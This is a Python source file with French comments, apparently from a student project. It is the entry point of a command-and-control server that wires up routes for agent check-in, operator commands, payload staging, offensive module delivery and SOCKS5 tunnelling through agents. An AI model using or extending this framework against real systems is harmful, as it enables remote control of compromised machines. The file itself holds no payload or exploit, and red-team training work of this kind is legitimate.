# ============================================================
#  server/main.py — Point d'entrée du serveur C2
#  Rôle        : Assemblage FastAPI, démarrage, bannière
#  Importé par : uvicorn (lancement)
#  Dépend de   : tous les modules server
#
#  LANCEMENT CORRECT :
#    cd C:\Users\hp\Desktop\PFE\C2-framwork\phase1-modulaire
#    python server/main-server.py
# ============================================================

import sys
import os
import asyncio                                       # CORRECTION : nécessaire pour get_event_loop()

# ── Fix imports ───────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(__file__))

from contextlib import asynccontextmanager
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

from config   import HOST, PORT
from database import init_database, get_all_pending_tasks
from cleanup  import start_cleanup_thread
from routes   import agent, operator, stage, modules, tunnel
import storage


@asynccontextmanager
async def lifespan(app: FastAPI):
    """
    Démarrage et arrêt propre du serveur.
    AVANT yield → démarrage.
    APRÈS yield → arrêt (Ctrl+C).
    """
    # ── DÉMARRAGE ─────────────────────────────────────────────
    print("=" * 60)
    print("  Serveur C2 - Phase 2 (SQLite + Session Tracking)")
    print("=" * 60)

    await init_database()
    print("[OK] Base de données initialisée")

    pending_tasks = await get_all_pending_tasks()
    for task in pending_tasks:
        storage.add_task_to_memory(
            task["agent_id"],
            task["task_id"],
            task["command"],
            task.get("module",    "shell"),
            task.get("file_data", ""),
            task.get("filename",  ""),
            task.get("technique", ""),
        )
    print(f"[OK] {len(pending_tasks)} tâches en attente rechargées en mémoire")

    loop = asyncio.get_event_loop()
    start_cleanup_thread(loop)          # ← loop passée ici

    print(f"\n[ENDPOINTS AGENT]")
    print("  POST /agent/register")
    print("  GET  /agent/{id}/poll")
    print("  POST /agent/result")

    print(f"\n[ENDPOINTS OPERATOR]")
    print("  POST /operator/login")
    print("  POST /operator/logout")
    print("  POST /operator/command")
    print("  GET  /operator/agents")
    print("  GET  /operator/agent/{id}")
    print("  GET  /operator/results")
    print("  GET  /operator/result/{task_id}")
    print("  GET  /operator/sessions")
    print("  GET  /operator/history")
    print("  GET  /operator/events")
    print("  GET  /operator/stats")

    print(f"\n[ENDPOINTS STAGING]")
    print("  GET  /stage/payload/{type}?os=linux|windows")
    print("  GET  /stage/list")

    print(f"\n[ENDPOINTS MODULES]")
    print("  GET  /api/modules/{name}?technique=bof&arch=x64")
    print("  GET  /api/modules/")

    print(f"\n[ENDPOINTS TUNNEL SOCKS5]")
    print("  POST   /operator/tunnel/start")
    print("  GET    /operator/tunnel/list")
    print("  GET    /operator/tunnel/{agent_id}")
    print("  DELETE /operator/tunnel/{agent_id}")
    print("  GET    /tunnel/{agent_id}/poll        (agent)")
    print("  POST   /tunnel/data                   (agent)")
    print("\n" + "=" * 60)

    yield   # ← serveur actif ici

    # ── ARRÊT ─────────────────────────────────────────────────
    print("\n[OK] Serveur arrêté proprement")


# ── Application FastAPI ───────────────────────────────────────
app = FastAPI(
    title="C2 Framework Phase 2",
    description="Framework C2 professionnel avec SQLite et session tracking",
    version="2.0.0",
    lifespan=lifespan
)

# ── CORS ──────────────────────────────────────────────────────
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ── Routeurs ──────────────────────────────────────────────────
app.include_router(agent.router)
app.include_router(operator.router)
app.include_router(stage.router)
app.include_router(modules.router)
app.include_router(tunnel.router)


# ── Lancement ─────────────────────────────────────────────────
if __name__ == "__main__":
    uvicorn.run(
        app,
        host=HOST,
        port=PORT,
        log_level="info",
        reload=False
    )